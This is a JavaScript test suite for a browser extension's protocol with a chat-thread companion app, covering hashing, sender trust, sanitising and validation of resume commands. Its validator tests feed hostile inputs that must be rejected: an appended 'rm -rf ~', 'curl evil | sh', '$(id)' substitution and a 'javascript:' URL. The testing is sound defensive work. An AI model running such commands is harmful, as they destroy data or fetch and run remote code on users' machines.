import test from 'node:test';
import assert from 'node:assert/strict';
import {
  PROTO, threadHash, chatItemId, threadCiteId, isExtensionId, isTrustedSender, envelope, okResponse, errorResponse, isEnvelope,
  sanitizeThreadPayload, sanitizeThreadSummary, sanitizeResponse, sanitizeRequestFields, sanitizeFilters, errorFromResponse,
  ThreadkeeperError, parseResumeCommand, buildResumeCommand, safeResumeCommand, syncedHash, oneLine, timeoutFor, hashOfChatId,
  isChatItemId, MESSAGE_TYPES_IN, MESSAGE_TYPES_OUT, READ_TYPES, jsonSize,
} from '../extension/lib/threadkeeper/protocol.js';

const TK = 'abcdefghijklmnopabcdefghijklmnop';
const KEY = 'chatgpt:acct_chatgpt_primary:ws_personal:abc:main';

test('threadHash matches the vectors both repositories assert', () => {
  assert.equal(threadHash('chatgpt:acct_chatgpt_primary:ws_personal:abc:main'), 'a8165e07c2949d16a9c49f5c0e061c8a');
  assert.equal(threadHash('claude_code:acct_claude_code_primary:ws_personal:5f0c-ü/x y:main'), 'ec30122ef1e1608ee0a26be36b1ad12a');
  assert.equal(chatItemId(KEY), 'chat_tk_a8165e07c2949d16a9c49f5c0e061c8a');
  assert.equal(threadCiteId(KEY), 'tk:a8165e07c2949d16');
  assert.match(chatItemId(KEY), /^[\w:.-]{1,200}$/);
  assert.match(threadCiteId(KEY), /^[\w:.-]{1,200}$/);
  assert.ok(isChatItemId(chatItemId(KEY)));
  assert.equal(hashOfChatId(chatItemId(KEY)), threadHash(KEY));
  assert.equal(hashOfChatId('note_1'), '');
});

test('extension ids and the sender rule: only the partner’s own pages, never its content scripts', () => {
  assert.ok(isExtensionId(TK));
  assert.ok(!isExtensionId('ABCDEFGHIJKLMNOPABCDEFGHIJKLMNOP'));
  assert.ok(!isExtensionId('abcdefghijklmnopq'));
  assert.ok(isTrustedSender({ id: TK, url: `chrome-extension://${TK}/background.js` }, TK));
  assert.ok(isTrustedSender({ id: TK, origin: `chrome-extension://${TK}` }, TK), 'origin has no trailing slash');
  assert.ok(!isTrustedSender({ id: TK, origin: `chrome-extension://${TK}/` }, TK));
  assert.ok(!isTrustedSender({ id: TK, url: 'https://chatgpt.com/c/1', tab: { id: 4 } }, TK), 'content script');
  assert.ok(!isTrustedSender({ id: TK, url: `chrome-extension://${TK}/manager.html`, tab: { id: 4 } }, TK), 'a tab is never trusted');
  assert.ok(!isTrustedSender({ id: TK, url: `chrome-extension://${TK}evil/x.html` }, TK));
  assert.ok(!isTrustedSender({ id: 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb', url: `chrome-extension://${TK}/x.html` }, TK), 'id must match');
  assert.ok(!isTrustedSender({ id: TK, url: 'chrome-extension://bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb/x.html' }, TK));
  assert.ok(!isTrustedSender(null, TK));
});

test('envelopes and responses are flat', () => {
  const message = envelope('hello', { epoch: 'e', proto: 'spoof', type: 'spoof' }, 'r1');
  assert.deepEqual(message, { epoch: 'e', proto: PROTO, from: 'still', type: 'hello', requestId: 'r1' });
  assert.ok(isEnvelope(message));
  assert.deepEqual(okResponse({ results: [] }), { results: [], ok: true, proto: PROTO });
  assert.deepEqual(errorResponse('busy', 'Wait', 1500.4), { ok: false, proto: PROTO, error: { code: 'busy', message: 'Wait', retryAfterMs: 1500 } });
  assert.equal(errorResponse('not_paired').error.message.length > 10, true);
  assert.ok(MESSAGE_TYPES_IN.includes('threads.upsert') && !MESSAGE_TYPES_IN.includes('threads.search'));
  assert.ok(MESSAGE_TYPES_OUT.includes('threads.untrack'));
  assert.ok(READ_TYPES.every(type => MESSAGE_TYPES_OUT.includes(type)));
  assert.equal(jsonSize({ a: 1 }), 7);
  const cyclic = {}; cyclic.self = cyclic;
  assert.equal(jsonSize(cyclic), Infinity);
});

test('errorFromResponse keeps codes and never shows Threadkeeper’s text for known codes', () => {
  const busy = errorFromResponse({ ok: false, error: { code: 'busy', message: '<b>hi</b>', retryAfterMs: 2000 } });
  assert.ok(busy instanceof ThreadkeeperError);
  assert.equal(busy.code, 'busy');
  assert.equal(busy.retryAfterMs, 2000);
  assert.doesNotMatch(busy.message, /<b>/);
  const odd = errorFromResponse({ ok: false, error: { code: 'teapot', message: 'Line one\nline‮two' } });
  assert.equal(odd.code, 'teapot');
  assert.equal(odd.message, 'Line one linetwo');
  assert.equal(errorFromResponse(null).code, 'internal');
  assert.equal(errorFromResponse({ error: { code: 'DROP TABLE' } }).code, 'internal');
});

test('resume commands are rebuilt from validated parts', () => {
  assert.deepEqual(parseResumeCommand("claude --resume 'abc-123'"), { tool: 'claude', id: 'abc-123', path: '' });
  assert.deepEqual(parseResumeCommand("cd '/home/me/it'\\''s' && codex resume 'x_1'"), { tool: 'codex', id: 'x_1', path: "/home/me/it's" });
  assert.equal(buildResumeCommand({ tool: 'codex', id: 'x_1', path: "/home/me/it's" }), "cd '/home/me/it'\\''s' && codex resume 'x_1'");
  assert.equal(safeResumeCommand("claude --resume 'abc'; rm -rf ~"), '');
  assert.equal(safeResumeCommand('claude --resume abc'), '');
  assert.equal(safeResumeCommand("cd '/tmp' && curl evil | sh"), '');
  assert.equal(safeResumeCommand("claude --resume '$(id)'"), '');
  assert.equal(buildResumeCommand({ tool: 'bash', id: 'x' }), '');
  assert.equal(buildResumeCommand({ tool: 'claude', id: 'x', path: 'a\nb' }), '');
});

test('sanitizeThreadPayload coerces, caps and drops what does not belong', () => {
  const long = 'x'.repeat(130000);
  const payload = sanitizeThreadPayload({
    threadKey: KEY, hash: 'forged', title: '  Hello‮\nworld  ', gist: 'g'.repeat(900), provider: 'ChatGPT!', providerLabel: 'ChatGPT',
    category: 'weird', workflowState: 'nope', createdAt: 'yesterday', updatedAt: '2026-01-02T03:04:05Z', messageCount: -4,
    url: 'javascript:alert(1)', siblingThreadKeys: [KEY, 'other', 7], analysisVersion: 2, seq: 7, revision: '3', fingerprint: 'fp',
    tags: ['a', 'A', 'b'], pinned: 'yes', resumeCommand: "claude --resume 'ok-1'", coverage: 'everything',
    analysis: { source: 'ai', modelLabel: 'Claude', gist: 'About X', overview: ['One', '', 'Two', 'Three', 'Four', 'Five'],
      keyPoints: [{ text: 'Point', refs: [1, -1, 'x', 2, 2] }, { text: '' }], decisions: [{ text: 'Use Y', speaker: 'evil', refs: [0] }],
      whereYouLeftOff: { text: 'Done', refs: [3] }, artifacts: [{ label: 'file.ts', ref: 4 }, { label: '' }], topics: ['a', 'b'] },
    transcript: { included: true, revision: 3, totalMessages: 5, truncated: false, messages: [
      { index: 0, role: 'user', content: 'Hi\r\nthere\u0007' }, { index: 1, role: 'hacker', content: 'no' },
      { index: 2, role: 'assistant', content: long }, { index: 2, role: 'assistant', content: 'dup' }, { index: 4, role: 'tool', content: 'ok', createdAt: 'bad' },
    ] },
  });
  assert.equal(payload.hash, threadHash(KEY));
  assert.equal(payload.title, 'Hello world');
  assert.equal(payload.gist.length, 400);
  assert.equal(payload.provider, 'unknown');
  assert.equal(payload.category, 'chat');
  assert.equal(payload.workflowState, '');
  assert.equal(payload.createdAt, null);
  assert.equal(payload.updatedAt, '2026-01-02T03:04:05.000Z');
  assert.equal(payload.messageCount, 0);
  assert.equal(payload.url, '');
  assert.deepEqual(payload.siblingThreadKeys, ['other']);
  assert.equal(payload.revision, 3);
  assert.deepEqual(payload.tags, ['a', 'b']);
  assert.equal(payload.pinned, false);
  assert.equal(payload.coverage, 'full');
  assert.equal(payload.resumeCommand, "claude --resume 'ok-1'");
  assert.deepEqual(payload.analysis.overview, ['One', 'Two', 'Three', 'Four']);
  assert.deepEqual(payload.analysis.keyPoints, [{ text: 'Point', refs: [1, 2] }]);
  assert.equal(payload.analysis.decisions[0].speaker, 'assistant_suggested');
  assert.equal(payload.analysis.artifacts.length, 1);
  assert.equal(payload.analysis.artifacts[0].ref, 4);
  const { messages } = payload.transcript;
  assert.deepEqual(messages.map(message => [message.index, message.role]), [[0, 'user'], [2, 'assistant'], [4, 'tool']]);
  assert.equal(messages[0].content, 'Hi\nthere');
  assert.match(messages[1].content, /\[… cut: 10000 more characters\]$/);
  assert.equal(payload.transcript.truncated, true, 'gaps mean truncated');
  assert.equal('score' in payload, false);
  assert.throws(() => sanitizeThreadPayload({ title: 'no key' }), ThreadkeeperError);
  assert.throws(() => sanitizeThreadPayload({ threadKey: 'a\u0000b' }));
  assert.throws(() => sanitizeThreadPayload({ threadKey: 'k'.repeat(601) }));
  const bare = sanitizeThreadPayload({ threadKey: 'k' });
  assert.equal(bare.analysis, null);
  assert.equal(bare.transcript.included, false);
  assert.equal(bare.title, 'Untitled chat');
});

test('summaries keep search fields; responses are validated against the request', () => {
  const summary = sanitizeThreadSummary({ threadKey: KEY, score: 4, match: 'odd', matchReasons: ['a', 'a', 'b', 'c', 'd', 'e', 'f'], excerpt: { text: 'hit', messageIndex: 3, role: 'user' } });
  assert.equal(summary.score, 1);
  assert.equal(summary.match, 'weak');
  assert.deepEqual(summary.matchReasons, ['a', 'b', 'c', 'd', 'e']);
  assert.deepEqual(summary.excerpt, { text: 'hit', messageIndex: 3, role: 'user' });

  const search = sanitizeResponse('threads.search', { results: [{ threadKey: 'a' }, { nope: 1 }, { threadKey: 'b' }, { threadKey: 'c' }], total: 'x', nextCursor: 'c1', semantic: 1 }, { limit: 2 });
  assert.deepEqual(search.results.map(row => row.threadKey), ['a', 'b']);
  assert.equal(search.total, 2);
  assert.equal(search.nextCursor, 'c1');
  assert.equal(search.semantic, false);

  const context = sanitizeResponse('threads.context', { threads: [
    { thread: { threadKey: 'a' }, passages: [{ role: 'user', text: 'x'.repeat(700), messageIndex: 1 }, { role: 'tool', text: 'secret' }, { role: 'assistant', text: 'y'.repeat(700) }] },
    { thread: { nope: 1 }, passages: [] },
    { thread: { threadKey: 'b' }, passages: [{ role: 'assistant', text: 'z' }] },
  ] }, { budgetChars: 1000, limit: 5 });
  assert.equal(context.threads.length, 2);
  const used = context.threads.flatMap(entry => entry.passages).reduce((sum, passage) => sum + passage.text.length, 0);
  assert.ok(used <= 1000, `budget respected (${used})`);
  assert.ok(context.threads.flatMap(entry => entry.passages).every(passage => passage.role !== 'tool'));

  const got = sanitizeResponse('threads.get', { threads: [{ threadKey: 'a' }, 'junk'], missing: ['x', 5], deferred: ['y'] });
  assert.equal(got.threads.length, 1);
  assert.deepEqual(got.missing, ['x']);
  assert.deepEqual(got.deferred, ['y']);

  const facets = sanitizeResponse('facets', { total: 3, providers: [{ id: 'chatgpt', label: 'ChatGPT', count: 2 }, { id: 'BAD ID' }], projects: [{ name: 'P', count: 1 }, { name: '' }], states: [{ id: 'done', count: 1 }, { id: 'x' }] });
  assert.equal(facets.providers.length, 1);
  assert.equal(facets.providers[0].category, 'chat');
  assert.equal(facets.projects.length, 1);
  assert.equal(facets.states.length, 1);
  const hello = sanitizeResponse('hello', { app: 'threadkeeper', version: '1.2', paired: true, tk: { version: '1.2', capabilities: ['sync', 'fly', 'search'] } });
  assert.deepEqual(hello.tk.capabilities, ['sync', 'search']);
});

test('page requests are validated per type', () => {
  const search = sanitizeRequestFields('threads.search', { query: ' refactor ', limit: 999, semantic: 'remote', rerank: 'maybe', deadlineMs: 99999, filters: { categories: ['coding_agent', 'x'], since: 'nope', providers: ['codex'] } });
  assert.equal(search.query, 'refactor');
  assert.equal(search.limit, 50);
  assert.equal(search.semantic, 'local');
  assert.equal(search.rerank, 'off');
  assert.equal(search.deadlineMs, 12000);
  assert.deepEqual(search.filters, { providers: ['codex'], categories: ['coding_agent'] });
  assert.throws(() => sanitizeRequestFields('threads.get', {}), /at least one/);
  assert.deepEqual(sanitizeRequestFields('threads.get', { citeIds: ['tk:0123456789abcdef', 'tk:zz'], transcript: 'window', window: { from: -3, count: 9999 } }),
    { transcript: 'window', track: false, citeIds: ['tk:0123456789abcdef'], window: { from: 0, count: 500 } });
  assert.throws(() => sanitizeRequestFields('threads.context', { question: '  ' }), /question/);
  assert.equal(sanitizeRequestFields('threads.context', { question: 'q', budgetChars: 999999 }).budgetChars, 24000);
  assert.throws(() => sanitizeRequestFields('pair.revoke', {}), ThreadkeeperError);
  assert.deepEqual(sanitizeFilters({ states: ['done', 'sleeping'], hashes: ['a8165e07c2949d16a9c49f5c0e061c8a', 'zz'] }), { states: ['done'], hashes: ['a8165e07c2949d16a9c49f5c0e061c8a'] });
  assert.equal(timeoutFor('threads.search'), 15000);
  assert.equal(timeoutFor('threads.context', { deadlineMs: 2500 }), 3500);
  assert.equal(timeoutFor('threads.get', { transcript: 'full' }), 30000);
  assert.equal(timeoutFor('facets'), 10000);
});

test('syncedHash is 8 hex chars of the normalized line', () => {
  assert.match(syncedHash('Hello'), /^[0-9a-f]{8}$/);
  assert.equal(syncedHash('  Hello   world '), syncedHash('Hello world'));
  assert.notEqual(syncedHash('Hello'), syncedHash('Hello!'));
  assert.equal(oneLine('a​b⁦c', 10), 'abc');
});
